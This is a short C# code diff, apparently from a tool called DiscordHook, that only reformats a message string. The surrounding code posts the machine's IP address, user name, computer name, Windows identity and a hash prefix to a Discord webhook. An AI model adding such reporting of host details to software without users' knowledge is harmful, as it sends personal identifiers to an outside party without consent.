@@ -29,7 +29,8 @@ namespace DiscordHook
                 try
                 {
                     await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>{
-                        {"content", $"```IP: {ip}\nSession name: {Environment.UserName}\n" +
+                        {"content", $"```IP: {ip}\n" +
+                                    $"Session name: {Environment.UserName}\n" +
                                     $"Computer name: {Environment.MachineName}\n" +
                                     $"Sha256 hash: {hashprefix}```"},
                         {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
